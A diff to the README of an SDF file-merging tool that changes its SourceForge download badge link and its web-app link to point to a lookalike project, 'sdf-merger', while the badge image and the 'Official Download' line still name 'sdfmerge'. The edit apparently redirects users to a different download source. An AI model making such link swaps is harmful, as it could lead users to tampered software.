@@ -26,7 +26,7 @@
 ### Visit: [![Live Website](https://img.shields.io/badge/Live-Website-blue)](https://ismielabir.github.io/SDF-File-Merge/)
 
 ## 🖥️ Desktop Application Usage
-### Step 1: Download the Application from SourceForge: [![SourceForge Download](https://img.shields.io/sourceforge/dm/sdfmerge?label=SourceForge%20Downloads)](https://sourceforge.net/projects/sdfmerge/)
+### Step 1: Download the Application from SourceForge: [![SourceForge Download](https://img.shields.io/sourceforge/dm/sdfmerge?label=SourceForge%20Downloads)](https://sourceforge.net/projects/sdf-merger/)
 ### Official Download: https://sourceforge.net/projects/sdfmerge/
 
 ### Step 2: Select Input Folder Path: All .sdf files will be automatically detected
@@ -34,7 +34,7 @@
 ### Step 4: Start Merge Process
 
 ## 🌐 Web Application Usage 
-### Use direct from webpage: https://ismielabir.github.io/SDF-File-Merge/
+### Use direct from webpage: https://sourceforge.net/projects/sdf-merger/
 ### Drag & Drop: Drop SDF/ZIP files directly
 ### Real-time Processing: Visual progress indicator
 ### No Uploads: All processing happens locally in your browser
